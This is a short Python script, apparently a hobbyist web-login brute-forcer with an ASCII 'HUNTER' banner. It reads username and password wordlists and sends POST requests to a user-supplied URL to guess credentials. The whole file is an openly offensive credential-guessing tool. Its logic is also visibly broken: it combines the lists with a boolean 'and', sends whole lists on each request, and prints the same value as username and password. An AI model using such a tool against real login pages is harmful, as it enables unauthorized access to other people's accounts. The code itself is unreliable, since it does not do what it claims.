#!/usr/bin/env python3
import requests

print("   __ ____  ___  _______________ ")
print("  / // / / / / |/ /_  __/ __/ _ \\")
print(" / _  / /_/ /    / / / / _// , _/")
print("/_//_/\____/_/|_/ /_/ /___/_/|_| ")
print("[+] coded by: ph.phoenix [+]")
print("[-] if there is an error type this 'cat README.md' [-]")
print("\n")

url = input("url: ")
word1 = input("username wordlist: ")
word2 = input("password worlist: ")

def login(username, password):
	r = requests.post(url, data = {
			"username": username,
			"password": password,
	    })
	return r


with open(word1, "r") as h:
	usernames = [ line.strip() for line in h.read().split("\n") if line ]

with open(word2, "r") as h:
	passwords = [ line.strip() for line in h.read().split("\n") if line ]

credentials = usernames and passwords

for x in credentials:
	response = login(usernames, passwords).text
	print(f"""username: {x} | {response}
password: {x} | {response} \n""")

